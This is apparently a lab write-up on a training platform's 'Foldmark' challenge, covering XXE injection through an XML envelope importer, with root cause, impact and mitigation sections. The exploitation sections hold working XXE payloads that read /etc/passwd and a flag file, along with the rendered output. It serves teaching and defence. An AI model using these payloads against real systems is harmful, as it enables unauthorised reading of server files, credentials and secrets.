---
title: "XXE Injection via Envelope Import Leads to Arbitrary File Read | Foldmark"
date: 2026-06-09 18:00:00 +0530
categories: [A05 - Injection, XML External Entity]
tags: [xxe, xml, file-disclosure, webverselabs-pro, foldmark]
author: Shivansh Sharma
image:
  path: /assets/images/posts/foldmark-xxe-injection.webp
  alt: "Foldmark XML External Entity Injection"
---

## Lab Link

Lab: [Foldmark](https://dashboard.webverselabs-pro.com/challenges/envelope)

## Overview

Foldmark is a document envelope platform that allows organizations to import XML envelopes from competing e-signature providers.

The importer parses user-supplied XML files and renders a preview containing the signer, document title, timestamp, and organization. Because external entity processing was enabled, the XML parser was vulnerable to XML External Entity (XXE) Injection, allowing arbitrary file disclosure from the underlying server.

## Objective

Exploit the XML envelope importer to read sensitive files from the server and retrieve the flag.

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── XML Injection
    └── XML External Entity (XXE)
        └── File Disclosure
```

The application accepted user-controlled XML input and processed external entities without proper security restrictions.

## Reconnaissance

First, create an account on the platform.

```bash
/register
```

After authentication, the application provides an envelope import feature.

```bash
/envelopes/import
```

The expected XML format is documented at:

```bash
/docs
```

A sample envelope contains fields such as signer information, document title, organization, and timestamp.

Because the application processes XML files supplied by users, the parser became an interesting target for XXE testing.

## Exploitation

To test whether external entities were enabled, create the following XML document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<envelope>
  <Signer>&xxe;</Signer>
  <DocumentTitle>Q1 Mutual NDA</DocumentTitle>
  <Timestamp>2026-05-13T09:14:22Z</Timestamp>
  <Organization>Vance &amp; Holloway LLP</Organization>
</envelope>
```

Upload the XML file through the envelope importer and generate a preview.

The contents of `/etc/passwd` are rendered inside the preview response.

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

This confirms that the XML parser is resolving external entities and reading files directly from the server filesystem.

## Proof of Exploitation

After confirming the XXE vulnerability, modify the external entity to reference the flag file.

```xml
<!ENTITY xxe SYSTEM "file:///flag.txt">
```

Final payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE envelope [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<envelope>
  <Signer>&xxe;</Signer>
  <DocumentTitle>Q1 Mutual NDA</DocumentTitle>
  <Timestamp>2026-05-13T09:14:22Z</Timestamp>
  <Organization>Vance &amp; Holloway LLP</Organization>
</envelope>
```

Upload the modified XML and preview the envelope again.

The application reads the contents of the flag file and injects them into the rendered preview.

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The XML parser was configured to process external entities contained within user-supplied XML documents.

When the parser encountered a `SYSTEM` entity, it retrieved the referenced resource and substituted the contents into the parsed document. Because no restrictions were applied, attackers could access arbitrary files on the server.

## Impact

Successful exploitation allows attackers to:

* Read arbitrary files from the server
* Access configuration files and application secrets
* Expose credentials and API keys
* Leak source code and internal application data
* Gather information useful for further attacks

## Mitigation

Disable XML external entity processing entirely.

Recommended defenses include:

* Disable DTD processing
* Disable external entities
* Disable parameter entities
* Reject XML documents containing `<!DOCTYPE>`
* Use secure XML parser configurations
* Prefer JSON when XML support is unnecessary

## Real-World Insight

XXE vulnerabilities frequently appear in document importers, file conversion services, and legacy enterprise integrations that rely on XML.

Although modern frameworks often disable external entities by default, custom parser configurations and older libraries continue to introduce XXE flaws that can lead to file disclosure, SSRF, and other high-impact attacks.

Foldmark demonstrates a classic XXE scenario where an XML-based migration feature inadvertently grants attackers access to sensitive files stored on the server.
